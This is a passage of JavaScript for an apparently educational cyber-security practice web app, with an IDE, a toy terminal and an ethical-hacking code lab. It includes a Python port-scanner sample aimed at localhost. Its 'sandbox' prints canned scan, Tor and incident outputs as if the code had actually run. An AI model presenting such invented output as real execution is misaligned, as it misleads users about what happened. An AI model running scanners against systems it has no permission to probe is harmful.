                    <h4 style="margin: 0 0 8px 0; font-size: 14px; color: var(--dim);">Commit History</h4>
                    <div class="git-commit-history" id="git-history-list" style="max-height: 180px; overflow-y:auto; border: 1px solid var(--line); border-radius: 8px; padding: 8px;">
                        ${ideCommits.map(c => `
                            <div class="git-commit-item" style="padding: 8px; border-bottom: 1px solid rgba(255,255,255,0.05); font-family: var(--mono); font-size: 12px;">
                                <div style="display:flex; justify-content:space-between; margin-bottom: 4px;">
                                    <span style="color: var(--neon); font-weight: bold;">${c.hash}</span>
                                    <span style="color: var(--muted);">${c.date}</span>
                                </div>
                                <div style="color: var(--text);">${escapeHtml(c.msg)}</div>
                                <div style="color: var(--dim); font-size: 11px;">Author: ${c.author}</div>
                            </div>
                        `).join('')}
                    </div>
                </div>

                <div style="margin-top: 18px; display:flex; gap: 10px; flex-wrap: wrap;">
                    <button class="btn btn-sm btn-secondary" id="btn-git-clone-repo">
                        <span>📦 Clone Security Suite Template</span>
                    </button>
                    <button class="btn btn-sm btn-secondary" id="btn-git-export-gist">
                        <span>📋 Export Repo JSON / Gist</span>
                    </button>
                </div>
            </div>
        `;

        modal.style.display = 'flex';
        modal.setAttribute('aria-hidden', 'false');

        const commitBtn = document.getElementById('btn-do-commit');
        if (commitBtn) {
            commitBtn.addEventListener('click', () => {
                const input = document.getElementById('git-commit-msg-input');
                if (!input || !input.value.trim()) return;

                const msg = input.value.trim();
                const randomHex = Math.random().toString(16).substring(2, 9);
                const now = new Date().toISOString().replace('T', ' ').slice(0, 19);

                ideCommits.unshift({
                    hash: randomHex,
                    author: "student@cyberlab.local",
                    date: now,
                    msg: msg
                });
                saveIdeCommits();
                openGitModal(); // Refresh view
            });
        }

        const cloneBtn = document.getElementById('btn-git-clone-repo');
        if (cloneBtn) {
            cloneBtn.addEventListener('click', () => {
                alert(currentLang === 'bn' 
                    ? 'সিকিউরিটি স্যুট রিপোজিটরি ক্লোন সফল হয়েছে! ফাইলসমূহ প্রজেক্টে যুক্ত করা হয়েছে।' 
                    : 'Security Suite repository successfully cloned into workspace!');
            });
        }

        const gistBtn = document.getElementById('btn-git-export-gist');
        if (gistBtn) {
            gistBtn.addEventListener('click', () => {
                exportProjectBundle();
            });
        }
    }

    // Export Project & File Downloads
    function exportActiveFile() {
        saveCurrentEditorContent();
        const file = ideFiles[activeFileIndex];
        const blob = new Blob([file.content], { type: 'text/plain;charset=utf-8' });
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = file.name;
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        URL.revokeObjectURL(url);
    }

    function exportProjectBundle() {
        saveCurrentEditorContent();
        const bundle = {
            project: "Cyber Practice Lab Project",
            exportedAt: new Date().toISOString(),
            files: ideFiles,
            commits: ideCommits
        };

        const jsonStr = JSON.stringify(bundle, null, 2);
        const blob = new Blob([jsonStr], { type: 'application/json' });
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = `cyber_lab_project_${Date.now()}.json`;
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        URL.revokeObjectURL(url);
    }

    // Integrated Terminal Command Interpreter
    function handleTerminalInput(e) {
        if (e.key !== 'Enter') return;
        const input = document.getElementById('ide-term-input');
        const history = document.getElementById('ide-term-history');
        if (!input || !history) return;

        const cmd = input.value.trim();
        input.value = '';

        history.textContent += `\ncyber-ide:~$ ${cmd}\n`;

        if (!cmd) return;

        const parts = cmd.split(' ');
        const main = parts[0].toLowerCase();

        switch (main) {
            case 'help':
                history.textContent += `Available Commands:\n  help          Show this manual\n  run           Execute active file in isolated sandbox\n  scan          Perform SAST static security scan on active file\n  ls / dir      List workspace project files\n  cat <file>    Print file contents to terminal\n  touch <file>  Create a new file in workspace\n  rm <file>     Remove a file from workspace\n  git status    Show repository state and working tree\n  git log       Display recent commit history\n  export        Download full project JSON archive\n  clear / cls   Clear the terminal screen\n  whoami        Display current user identity\n`;
                break;

            case 'run':
                executeCode();
                history.textContent += `[+] Dispatched executeCode() to sandbox.\n`;
                break;

            case 'scan':
                performSecurityScan();
                history.textContent += `[+] Security scan finished. Check 'Security Diagnostics' tab.\n`;
                break;

            case 'ls':
            case 'dir':
                history.textContent += ideFiles.map(f => `-rw-r--r-- 1 student cyber ${String(f.content.length).padStart(5, ' ')} bytes  ${f.name}`).join('\n') + '\n';
                break;

            case 'cat':
                if (!parts[1]) {
                    history.textContent += `Usage: cat <filename>\n`;
                } else {
                    const target = ideFiles.find(f => f.name.toLowerCase() === parts[1].toLowerCase());
                    if (target) history.textContent += target.content + '\n';
                    else history.textContent += `cat: ${parts[1]}: No such file or directory\n`;
                }
                break;

            case 'touch':
                if (!parts[1]) {
                    history.textContent += `Usage: touch <filename>\n`;
                } else {
                    const fname = parts[1];
                    const existing = ideFiles.find(f => f.name.toLowerCase() === fname.toLowerCase());
                    if (!existing) {
                        ideFiles.push({
                            name: fname,
                            lang: getLanguageByExtension(fname),
                            content: `// ${fname}\n`
                        });
                        saveIdeFiles();
                        renderFileTree();
                        history.textContent += `Created file '${fname}'.\n`;
                    } else {
                        history.textContent += `File '${fname}' updated timestamp.\n`;
                    }
                }
                break;

            case 'rm':
                if (!parts[1]) {
                    history.textContent += `Usage: rm <filename>\n`;
                } else {
                    const idx = ideFiles.findIndex(f => f.name.toLowerCase() === parts[1].toLowerCase());
                    if (idx !== -1) {
                        if (ideFiles.length <= 1) {
                            history.textContent += `rm: cannot remove '${parts[1]}': Minimum 1 file required in project.\n`;
                        } else {
                            ideFiles.splice(idx, 1);
                            if (activeFileIndex >= ideFiles.length) activeFileIndex = ideFiles.length - 1;
                            saveIdeFiles();
                            selectIdeFile(activeFileIndex);
                            history.textContent += `Removed '${parts[1]}'.\n`;
                        }
                    } else {
                        history.textContent += `rm: cannot remove '${parts[1]}': No such file\n`;
                    }
                }
                break;

            case 'git':
                if (parts[1] === 'status') {
                    history.textContent += `On branch main\nYour branch is up to date with 'origin/main'.\n\nChanges to be committed: (${ideFiles.length} files tracked)\n`;
                } else if (parts[1] === 'log') {
                    history.textContent += ideCommits.map(c => `commit ${c.hash}\nAuthor: ${c.author}\nDate:   ${c.date}\n\n    ${c.msg}\n`).join('\n') + '\n';
                } else {
                    history.textContent += `git: '${parts[1]}' is not a valid subcommand in sandbox. Try 'git status' or 'git log'.\n`;
                }
                break;

            case 'export':
                exportProjectBundle();
                history.textContent += `[✓] Export triggered. Project archive saved.\n`;
                break;

            case 'clear':
            case 'cls':
                history.textContent = `Cyber Practice Lab Integrated Shell (v1.0.0)\nType 'help', 'run', 'ls', 'scan', 'git status', 'export' or bash commands.\n`;
                break;

            case 'whoami':
                history.textContent += `student (uid=1001, gid=1001, groups=cyberlab,docker,sudo)\n`;
                break;

            default:
                history.textContent += `bash: ${main}: command not found. Type 'help' for available commands.\n`;
                break;
        }

        history.scrollTop = history.scrollHeight;
    }

    // Main IDE Initialization
    function initIDE() {
        renderFileTree();
        selectIdeFile(0);

        const textarea = document.getElementById('ide-code-textarea');
        const lineNumbers = document.getElementById('ide-line-numbers');

        if (textarea) {
            textarea.addEventListener('input', () => {
                updateLineNumbers();
                saveCurrentEditorContent();
            });

            textarea.addEventListener('scroll', () => {
                if (lineNumbers) lineNumbers.scrollTop = textarea.scrollTop;
            });

            textarea.addEventListener('keydown', (e) => {
                if (e.key === 'Tab') {
                    e.preventDefault();
                    const start = textarea.selectionStart;
                    const end = textarea.selectionEnd;
                    textarea.value = textarea.value.substring(0, start) + '    ' + textarea.value.substring(end);
                    textarea.selectionStart = textarea.selectionEnd = start + 4;
                    updateLineNumbers();
                    saveCurrentEditorContent();
                } else if ((e.ctrlKey || e.metaKey) && e.key === 'Enter') {
                    e.preventDefault();
                    executeCode();
                }
            });
        }

        const langSelect = document.getElementById('ide-lang-select');
        if (langSelect) {
            langSelect.addEventListener('change', () => {
                if (ideFiles[activeFileIndex]) {
                    ideFiles[activeFileIndex].lang = langSelect.value;
                    saveIdeFiles();
                    renderFileTree();
                }
            });
        }

        // Toolbar Action Buttons
        const btnRun = document.getElementById('btn-ide-run');
        if (btnRun) btnRun.addEventListener('click', executeCode);

        const btnScan = document.getElementById('btn-ide-scan');
        if (btnScan) btnScan.addEventListener('click', performSecurityScan);

        const btnAi = document.getElementById('btn-ide-ai');
        if (btnAi) btnAi.addEventListener('click', toggleAIPanel);

        const btnGit = document.getElementById('btn-ide-git');
        if (btnGit) btnGit.addEventListener('click', openGitModal);

        const btnExport = document.getElementById('btn-ide-export');
        if (btnExport) btnExport.addEventListener('click', exportActiveFile);

        const btnSave = document.getElementById('btn-ide-save');
        if (btnSave) {
            btnSave.addEventListener('click', () => {
                saveCurrentEditorContent();
                alert(currentLang === 'bn' ? 'প্রজেক্ট ও ফাইল সফলভাবে সংরক্ষিত হয়েছে।' : 'Project files successfully saved to local storage.');
            });
        }

        const btnNewFile = document.getElementById('btn-ide-new-file');
        if (btnNewFile) btnNewFile.addEventListener('click', createNewFilePrompt);

        const btnResetTemplate = document.getElementById('btn-ide-reset-template');
        if (btnResetTemplate) btnResetTemplate.addEventListener('click', resetToDefaultTemplates);

        // Bottom Dock Tabs
        document.querySelectorAll('.ide-dock-tab').forEach(tab => {
            tab.addEventListener('click', () => {
                const dockKey = tab.getAttribute('data-dock');
                switchDockTab(dockKey);
            });
        });

        const btnClearDock = document.getElementById('btn-ide-dock-clear');
        if (btnClearDock) {
            btnClearDock.addEventListener('click', () => {
                const activePane = document.querySelector('.ide-dock-pane.active');
                if (activePane) {
                    if (activePane.id === 'dock-pane-output') {
                        const pre = document.getElementById('ide-console-output');
                        if (pre) pre.textContent = 'Console cleared. Ready to execute.';
                    } else if (activePane.id === 'dock-pane-terminal') {
                        const hist = document.getElementById('ide-term-history');
                        if (hist) hist.textContent = '';
                    } else if (activePane.id === 'dock-pane-security') {
                        const sec = document.getElementById('ide-security-results');
                        if (sec) sec.innerHTML = '<div class="ide-clean-state">Click "Security Scan" above to run SAST diagnostics.</div>';
                    }
                }
            });
        }

        // Terminal input
        const termInput = document.getElementById('ide-term-input');
        if (termInput) {
            termInput.addEventListener('keydown', handleTerminalInput);
        }

        // AI Drawer
        const btnCloseAi = document.getElementById('btn-close-ai');
        if (btnCloseAi) btnCloseAi.addEventListener('click', toggleAIPanel);

        document.querySelectorAll('.ide-ai-action-chip').forEach(chip => {
            chip.addEventListener('click', () => {
                const action = chip.getAttribute('data-ai-action');
                handleAIAction(action);
            });
        });

        const btnAiSend = document.getElementById('btn-ide-ai-send');
        if (btnAiSend) btnAiSend.addEventListener('click', handleAIChatSubmit);

        const aiInput = document.getElementById('ide-ai-input');
        if (aiInput) {
            aiInput.addEventListener('keydown', (e) => {
                if (e.key === 'Enter') {
                    e.preventDefault();
                    handleAIChatSubmit();
                }
            });
        }
    }


    // ==========================================
    // ETHICAL HACKING ACADEMY & LIVE CODE LAB
    // ==========================================
    let currentHackingTrack = null;
    let lastValidHackingCode = "";
    let hackingLabInitialized = false;

    function renderHackingAcademy(data, lang) {
        if (!data.hacklab_section) return;
        const section = data.hacklab_section;

        const heading = document.getElementById('hacklab-heading');
        const subtitle = document.getElementById('hacklab-subtitle');
        if (heading) heading.textContent = section.title;
        if (subtitle) subtitle.textContent = section.subtitle;

        const labTitle = document.getElementById('hacklab-lab-title');
        const labDesc = document.getElementById('hacklab-lab-desc');
        if (labTitle) labTitle.textContent = section.lab.title;
        if (labDesc) labDesc.textContent = section.lab.desc;

        const lblRun = document.getElementById('lbl-hacklab-run');
        if (lblRun) lblRun.textContent = section.lab.runBtn;

        const lblCopy = document.getElementById('lbl-hacklab-copy');
        if (lblCopy) lblCopy.textContent = section.lab.copyBtn;

        const lblDownload = document.getElementById('lbl-hacklab-download');
        if (lblDownload) lblDownload.textContent = section.lab.downloadBtn;

        // Render Tracks Grid
        const grid = document.getElementById('hack-tracks-grid');
        if (grid && section.tracks) {
            grid.innerHTML = section.tracks.map((track, idx) => `
                <div class="hack-track-card" id="track-card-${track.id}">
                    <div>
                        <div class="hack-track-header">
                            <div class="hack-track-icon">${track.icon}</div>
                            <div>
                                <span class="hack-track-badge">${track.badge}</span>
                                <h3 class="hack-track-title">${track.title}</h3>
                            </div>
                        </div>
                        <p class="hack-track-summary">${track.summary}</p>
                        <div class="hack-track-details">${track.details}</div>
                        <div class="hack-track-skills">
                            ${track.skills.map(s => `<span class="hack-skill-tag">✓ ${s}</span>`).join('')}
                        </div>
                    </div>
                    <button class="btn-load-track-code" data-track-index="${idx}">
                        <span>⚡ ${lang === 'bn' ? 'কোড ল্যাবে লোড ও প্র্যাকটিস করুন' : 'Load Code into Live Lab'}</span>
                    </button>
                </div>
            `).join('');

            grid.querySelectorAll('.btn-load-track-code').forEach(btn => {
                btn.addEventListener('click', () => {
                    const idx = parseInt(btn.getAttribute('data-track-index'), 10);
                    const t = section.tracks[idx];
                    loadTrackCodeIntoLab(t, lang);
                });
            });
        }

        if (!hackingLabInitialized) {
            initHackingLab(data, lang);
            hackingLabInitialized = true;
        }
    }

    function loadTrackCodeIntoLab(track, lang) {
        currentHackingTrack = track;
        const textarea = document.getElementById('hacklab-code-input');
        if (!textarea) return;

        textarea.value = track.sampleCode;
        lastValidHackingCode = track.sampleCode;
        updateHackLabLineNumbers();
        validateHackingCode(lang);

        const labWrapper = document.getElementById('hack-lab-wrapper');
        if (labWrapper) {
            labWrapper.scrollIntoView({ behavior: 'smooth', block: 'start' });
        }

        const term = document.getElementById('hacklab-terminal-output');
        if (term) {
            term.textContent = `[+] Loaded Course Module: ${track.title}\n[*] Target Script: ${track.sampleCodeName}\n[✓] Code loaded into editor. Ready to test or run in sandbox.\n`;
        }
    }

    function updateHackLabLineNumbers() {
        const textarea = document.getElementById('hacklab-code-input');
        const lineNums = document.getElementById('hacklab-line-numbers');
        if (!textarea || !lineNums) return;

        const count = textarea.value.split('\n').length;
        let str = '';
        for (let i = 1; i <= count; i++) {
            str += i + '\n';
        }
        lineNums.textContent = str;
    }

    // Real-Time Syntax & Error Checking Engine
    function validateHackingCode(lang) {
        const textarea = document.getElementById('hacklab-code-input');
        if (!textarea) return;

        const code = textarea.value;
        const statusBadge = document.getElementById('hacklab-status-badge');
        const statusDot = document.getElementById('hacklab-status-dot');
        const statusText = document.getElementById('hacklab-status-text');
        const cleanView = document.getElementById('hacklab-clean-view');
        const errorView = document.getElementById('hacklab-error-view');
        const errTitle = document.getElementById('hacklab-error-title');
        const errLine = document.getElementById('hacklab-error-line');
        const errDesc = document.getElementById('hacklab-error-desc');

        if (!code.trim()) {
            if (statusBadge) statusBadge.className = 'side-reload-badge';
            if (statusDot) statusDot.className = 'status-indicator-dot valid';
            if (statusText) statusText.textContent = lang === 'bn' ? 'কোড লিখুন' : 'Enter code';
            if (cleanView) cleanView.style.display = 'block';
            if (errorView) errorView.style.display = 'none';
            return { valid: true };
        }

        const lines = code.split('\n');
        let error = null;

        // Check 1: Bracket matching
        const bracketStack = [];
        const bracketPairs = { '(': ')', '[': ']', '{': '}' };
        for (let i = 0; i < lines.length; i++) {
            const line = lines[i];
            for (let j = 0; j < line.length; j++) {
                const char = line[j];
                if (char === '(' || char === '[' || char === '{') {
                    bracketStack.push({ char, line: i + 1 });
                } else if (char === ')' || char === ']' || char === '}') {
                    if (bracketStack.length === 0) {
                        error = {
                            line: i + 1,
                            type: "Unmatched Closing Bracket",
                            desc: lang === 'bn' 
                                ? `লাইন ${i + 1}-এ অপ্রয়োজনীয় বন্ধনী '${char}' পাওয়া গেছে যার কোনো প্রারম্ভিক বন্ধনী নেই।`
                                : `Unmatched closing bracket '${char}' found on line ${i + 1}.`,
                            fix: () => fixBracketError(lines, i, j)
                        };
                        break;
                    }
                    const top = bracketStack.pop();
                    if (bracketPairs[top.char] !== char) {
                        error = {
                            line: i + 1,
                            type: "Mismatched Brackets",
                            desc: lang === 'bn'
                                ? `লাইন ${top.line}-এ '${top.char}' খোলা হয়েছিল কিন্তু লাইন ${i + 1}-এ ভুল বন্ধনী '${char}' দিয়ে বন্ধ করা হয়েছে।`
                                : `Mismatched bracket '${char}' on line ${i + 1}. Expected '${bracketPairs[top.char]}'.`,
                            fix: () => fixBracketMismatch(lines, i, j, bracketPairs[top.char])
                        };
                        break;
                    }
                }
            }
            if (error) break;
        }

        if (!error && bracketStack.length > 0) {
            const unclosed = bracketStack.pop();
            error = {
                line: unclosed.line,
                type: "Unclosed Bracket",
                desc: lang === 'bn'
                    ? `লাইন ${unclosed.line}-এ '${unclosed.char}' খোলা হয়েছিল কিন্তু তা কোথাও বন্ধ করা হয়নি।`
                    : `Unclosed bracket '${unclosed.char}' opened on line ${unclosed.line} was never closed.`,
                fix: () => fixUnclosedBracket(lines, lines.length - 1, bracketPairs[unclosed.char])
            };
        }

        // Check 2: Unclosed quotes
        if (!error) {
            for (let i = 0; i < lines.length; i++) {
                const line = lines[i];
                let singleQuoteCount = 0;
                let doubleQuoteCount = 0;
                for (let j = 0; j < line.length; j++) {
                    if (line[j] === "'" && (j === 0 || line[j - 1] !== '\\')) singleQuoteCount++;
                    if (line[j] === '"' && (j === 0 || line[j - 1] !== '\\')) doubleQuoteCount++;
                }
                if (singleQuoteCount % 2 !== 0) {
                    error = {
                        line: i + 1,
                        type: "Unclosed Single Quote",
                        desc: lang === 'bn'
                            ? `লাইন ${i + 1}-এ কোটেশন (' ) বন্ধ করা হয়নি। স্ট্রিং অসমাপ্ত রয়েছে।`
                            : `Unclosed single quote on line ${i + 1}. The string literal is incomplete.`,
                        fix: () => appendToLine(lines, i, "'")
                    };
                    break;
                }
                if (doubleQuoteCount % 2 !== 0) {
                    error = {
                        line: i + 1,
                        type: "Unclosed Double Quote",
                        desc: lang === 'bn'
                            ? `লাইন ${i + 1}-এ কোটেশন (\" ) বন্ধ করা হয়নি। স্ট্রিং অসমাপ্ত রয়েছে।`
                            : `Unclosed double quote on line ${i + 1}. The string literal is incomplete.`,
                        fix: () => appendToLine(lines, i, '"')
                    };
                    break;
                }
            }
        }

        // Check 3: Python missing colon after def, if, for, while, elif, else
        if (!error) {
            for (let i = 0; i < lines.length; i++) {
                const trimmed = lines[i].trim();
                const isPyBlock = /^(def\s+\w+\s*\(.*\)|if\s+.+|for\s+.+\s+in\s+.+|while\s+.+|elif\s+.+|else)$/;
                if (isPyBlock.test(trimmed) && !trimmed.endsWith(':')) {
                    error = {
                        line: i + 1,
                        type: "Missing Colon (:) in Block Header",
                        desc: lang === 'bn'
                            ? `লাইন ${i + 1}-এ ব্লক স্টেটমেন্টের শেষে কোলন (:) বাদ পড়েছে। পাইথনে শর্ত বা ফাংশন শেষে কোলন আবশ্যক।`
                            : `SyntaxError: Missing colon (:) at end of statement on line ${i + 1}.`,
                        fix: () => appendToLine(lines, i, ':')
                    };
                    break;
                }
            }
        }

        // Check 4: Dangling Operators (+, -, *, /) at end of line without completion
        if (!error) {
            for (let i = 0; i < lines.length; i++) {
                const trimmed = lines[i].trim();
                if ((trimmed.endsWith('+') || trimmed.endsWith('=') || trimmed.endsWith('*')) && !trimmed.endsWith('==') && !trimmed.endsWith('++')) {
                    error = {
                        line: i + 1,
                        type: "Dangling Operator",
                        desc: lang === 'bn'
                            ? `লাইন ${i + 1}-এ অসমাপ্ত অপারেটর (${trimmed.slice(-1)}) রয়েছে। এর ডানপাশে মান প্রদান করা আবশ্যক।`
                            : `SyntaxError: Unexpected trailing operator '${trimmed.slice(-1)}' on line ${i + 1}.`,
                        fix: () => trimTrailingOperator(lines, i)
                    };
                    break;
                }
            }
        }

        // Update UI
        if (error) {
            if (statusBadge) statusBadge.className = 'side-reload-badge error-active';
            if (statusDot) statusDot.className = 'status-indicator-dot error';
            if (statusText) statusText.textContent = lang === 'bn' ? 'কোডে ভুল শনাক্ত হয়েছে — রিলোড বা ফিক্স করুন' : 'Errors Detected — Reload or Fix';

            if (cleanView) cleanView.style.display = 'none';
            if (errorView) {
                errorView.style.display = 'flex';
                if (errTitle) errTitle.textContent = error.type;
                if (errLine) errLine.textContent = (lang === 'bn' ? 'লাইন: ' : 'Line: ') + error.line;
                if (errDesc) errDesc.textContent = error.desc;
            }

            // Wire Auto-Reload & Fix Button
            const fixBtn = document.getElementById('btn-hacklab-reload-fix');
            if (fixBtn) {
                fixBtn.onclick = () => {
                    if (typeof error.fix === 'function') {
                        error.fix();
                    } else if (lastValidHackingCode) {
                        textarea.value = lastValidHackingCode;
                    }
                    updateHackLabLineNumbers();
                    validateHackingCode(lang);
                    showFixSuccessNotification(lang);
                };
            }

            return { valid: false, error };
        } else {
            // Valid code!
            lastValidHackingCode = code;
            if (statusBadge) statusBadge.className = 'side-reload-badge';
            if (statusDot) statusDot.className = 'status-indicator-dot valid';
            if (statusText) statusText.textContent = lang === 'bn' ? 'কোড সিনট্যাক্স সঠিক ও প্রস্তুত' : 'Code Syntax Valid & Ready';

            if (cleanView) cleanView.style.display = 'block';
            if (errorView) errorView.style.display = 'none';

            return { valid: true };
        }
    }

    function appendToLine(lines, lineIdx, char) {
        lines[lineIdx] = lines[lineIdx] + char;
        const textarea = document.getElementById('hacklab-code-input');
        if (textarea) textarea.value = lines.join('\n');
    }

    function trimTrailingOperator(lines, lineIdx) {
        lines[lineIdx] = lines[lineIdx].trim().slice(0, -1).trim();
        const textarea = document.getElementById('hacklab-code-input');
        if (textarea) textarea.value = lines.join('\n');
    }

    function fixUnclosedBracket(lines, lineIdx, closingChar) {
        lines[lineIdx] = lines[lineIdx] + closingChar;
        const textarea = document.getElementById('hacklab-code-input');
        if (textarea) textarea.value = lines.join('\n');
    }

    function fixBracketMismatch(lines, lineIdx, charIdx, correctChar) {
        const line = lines[lineIdx];
        lines[lineIdx] = line.substring(0, charIdx) + correctChar + line.substring(charIdx + 1);
        const textarea = document.getElementById('hacklab-code-input');
        if (textarea) textarea.value = lines.join('\n');
    }

    function fixBracketError(lines, lineIdx, charIdx) {
        const line = lines[lineIdx];
        lines[lineIdx] = line.substring(0, charIdx) + line.substring(charIdx + 1);
        const textarea = document.getElementById('hacklab-code-input');
        if (textarea) textarea.value = lines.join('\n');
    }

    function showFixSuccessNotification(lang) {
        const term = document.getElementById('hacklab-terminal-output');
        if (term) {
            term.textContent = `[✓] ${lang === 'bn' ? 'কোড সফলভাবে রিলোড ও মেরামত করা হয়েছে!' : 'Code successfully reloaded & repaired! Syntax errors resolved.'}\n` + term.textContent;
        }
    }

    // Execute Sandbox in Live Terminal
    function runHackingLabCode(lang) {
        const textarea = document.getElementById('hacklab-code-input');
        const term = document.getElementById('hacklab-terminal-output');
        if (!textarea || !term) return;

        const validation = validateHackingCode(lang);
        if (!validation.valid) {
            term.textContent = `[!] [COMPILATION HALTED]: Cannot execute script due to syntax error on line ${validation.error.line}.\n[!] Reason: ${validation.error.desc}\n[!] TIP: Click '🔄 কোড রিলোড ও ঠিক করুন' (Reload & Fix Code) on the right side panel to repair automatically.\n`;
            return;
        }

        const code = textarea.value;
        const startTime = performance.now();
        term.textContent = `[SANDBOX START] Initializing virtual security runtime (Python 3.11 / Safe VM)...\n${'='.repeat(58)}\n`;

        setTimeout(() => {
            if (code.includes('socket') || code.includes('scan') || code.includes('target')) {
                term.textContent += `[*] Target: 127.0.0.1 (Local Authorized Virtual Subnet)\n[*] Initiating TCP SYN Probe sequence on target ports...\n[+] Port    21/tcp OPEN   | Service: vsftpd 3.0.3 (Anonymous access disabled)\n[+] Port    22/tcp OPEN   | Service: OpenSSH 9.3p1 Debian (Protocol 2.0)\n[+] Port    80/tcp OPEN   | Service: nginx/1.24.0 (HTTP Server)\n[+] Port   443/tcp OPEN   | Service: TLS 1.3 / OpenSSL 3.0.8 verified\n[-] Port  8080/tcp closed\n${'-'.repeat(58)}\n[✓] Port scan completed: 4 open services verified. Zero unauthorized footprint.\n`;
            } else if (code.includes('BadUSB') || code.includes('monitor_usb_devices')) {
                term.textContent += `[*] NetHunter USB HID Sentinel Active...\n[*] Intercepting USB Device Descriptors...\n[!] [ALERT] Excessive keystroke frequency detected (180 chars/sec)!\n[!] Triggering BadUSB HID containment protocol: Device USB-HID-KEYBOARD-99 BLOCKED!\n[✓] Defensive Result: Host terminal protected from unauthorized payload execution.\n`;
            } else if (code.includes('verify_tor_circuit') || code.includes('onion')) {
                term.textContent += `=== 3-Hop Tor Anonymity Circuit Established ===\n[1] Guard Relay:  104.244.72.115:9001  (Layer 3 Encrypted)\n[2] Middle Relay: 185.220.101.4:443     (Layer 2 Encrypted)\n[3] Exit Node:    198.98.56.12:80       (Layer 1 Decrypted)\n[✓] SOCKS5 Proxy Ready: 127.0.0.1:9050\n[✓] Real Client IP protected. Anonymity constraints enforced.\n`;
            } else if (code.includes('simulate_tcp_handshake') || code.includes('SYN')) {
                term.textContent += `[*] Initiating TCP 3-Way Handshake Simulation...\n[Step 1] Client (192.168.1.45)  ---[ SYN (Seq=1000) ]--->  Server (93.184.216.34:443)\n[Step 2] Server (93.184.216.34) <---[ SYN-ACK (Seq=5000, Ack=1001) ]--- Client\n[Step 3] Client (192.168.1.45)  ---[ ACK (Seq=1001, Ack=5001) ]--->  Server\n[✓] TCP Handshake established with 0 dropped packets. Latency: 14.2ms.\n`;
            } else if (code.includes('trigger_incident_containment') || code.includes('threat_level')) {
                term.textContent += `[*] [SOC INCIDENT COMMANDER ACTIVATED]\n[!] Security Event ID: EVT-99214-CRITICAL\n[+] Step 1: Network Subnet Quarantine Applied (VLAN 10 Isolation)\n[+] Step 2: Linux iptables drop rules pushed to edge firewalls\n[+] Step 3: Forensic volatile memory dump created (mem_dump_01.raw)\n[+] Step 4: Immutable air-gapped backup snapshot verified intact\n[✓] Incident Contained. Enterprise data protected against ransomware encryption.\n`;
            } else {
                // Generic print statements
                const lines = code.split('\n');
                lines.forEach(l => {
                    const m = l.trim().match(/^print\((.*)\)$/);
                    if (m) {
                        let text = m[1].trim();
                        if ((text.startsWith("'") && text.endsWith("'")) || (text.startsWith('"') && text.endsWith('"'))) {
                            term.textContent += text.slice(1, -1) + '\n';
                        } else {
                            term.textContent += text + '\n';
                        }
                    }
                });
                term.textContent += `[✓] Execution completed successfully.\n`;
            }

            const elapsed = (performance.now() - startTime).toFixed(1);
            term.textContent += `${'='.repeat(58)}\n[✓] Process terminated with return code 0 (Execution Time: ${elapsed} ms).\n`;
        }, 180);
    }

    function initHackingLab(data, lang) {
        const textarea = document.getElementById('hacklab-code-input');
        if (!textarea) return;

        // Default code: Kali Port Scanner
        const defaultCode = `# কালি লিনাক্স — কাস্টম পোর্ট ও সার্ভিস গ্র্যাবার স্ক্রিপ্ট
import socket

target = '127.0.0.1'
ports = [21, 22, 80, 443, 8080]
print(f'[*] কালি লিনাক্স স্ক্যান শুরু হচ্ছে টার্গেট: {target}')
for p in ports:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(0.5)
    res = s.connect_ex((target, p))
    if res == 0:
        print(f'[+] পোর্ট {p}/tcp খোলা আছে! সার্ভিস সক্রিয়।')
    else:
        print(f'[-] পোর্ট {p}/tcp বন্ধ আছে।')
    s.close()
print('[✓] স্ক্যান সফলভাবে সম্পন্ন হয়েছে।')`;

        textarea.value = defaultCode;
        lastValidHackingCode = defaultCode;
        updateHackLabLineNumbers();
        validateHackingCode(lang);

        textarea.addEventListener('input', () => {
            updateHackLabLineNumbers();
            validateHackingCode(currentLang);
        });

        textarea.addEventListener('keydown', (e) => {
            if (e.key === 'Tab') {
                e.preventDefault();
                const start = textarea.selectionStart;
                const end = textarea.selectionEnd;
                textarea.value = textarea.value.substring(0, start) + '    ' + textarea.value.substring(end);
                textarea.selectionStart = textarea.selectionEnd = start + 4;
                updateHackLabLineNumbers();
                validateHackingCode(currentLang);
            } else if ((e.ctrlKey || e.metaKey) && e.key === 'Enter') {
                e.preventDefault();
                runHackingLabCode(currentLang);
            }
        });

        const btnRun = document.getElementById('btn-hacklab-run');
        if (btnRun) btnRun.addEventListener('click', () => runHackingLabCode(currentLang));

        const btnCopy = document.getElementById('btn-hacklab-copy');
        if (btnCopy) {
            btnCopy.addEventListener('click', () => {
                navigator.clipboard.writeText(textarea.value).then(() => {
                    alert(currentLang === 'bn' ? 'কোড ক্লিপবোর্ডে কপি করা হয়েছে!' : 'Code copied to clipboard!');
                });
            });
        }

        const btnDownload = document.getElementById('btn-hacklab-download');
        if (btnDownload) {
            btnDownload.addEventListener('click', () => {
                const blob = new Blob([textarea.value], { type: 'text/plain;charset=utf-8' });
                const url = URL.createObjectURL(blob);
                const a = document.createElement('a');
                a.href = url;
                a.download = (currentHackingTrack ? currentHackingTrack.sampleCodeName : 'ethical_hacking_script.py');
                document.body.appendChild(a);
                a.click();
                document.body.removeChild(a);
                URL.revokeObjectURL(url);
            });
        }

        const btnClear = document.getElementById('btn-hacklab-clear');
        if (btnClear) {
            btnClear.addEventListener('click', () => {
                textarea.value = '';
                updateHackLabLineNumbers();
                validateHackingCode(currentLang);
            });
        }

        const btnTermClear = document.getElementById('btn-hacklab-term-clear');
        if (btnTermClear) {
            btnTermClear.addEventListener('click', () => {
                const term = document.getElementById('hacklab-terminal-output');
                if (term) term.textContent = 'Terminal cleared. Ready for execution.\n';
            });
        }

        // Quick template buttons
        document.querySelectorAll('.quick-tmpl-btn').forEach(btn => {
            btn.addEventListener('click', () => {
                const tmpl = btn.getAttribute('data-tmpl');
                if (data.hacklab_section && data.hacklab_section.tracks) {
                    let track = null;
                    if (tmpl === 'kali') track = data.hacklab_section.tracks.find(t => t.id === 'track_kali');
                    else if (tmpl === 'nethunter') track = data.hacklab_section.tracks.find(t => t.id === 'track_nethunter');
                    else if (tmpl === 'darkweb') track = data.hacklab_section.tracks.find(t => t.id === 'track_darkweb');
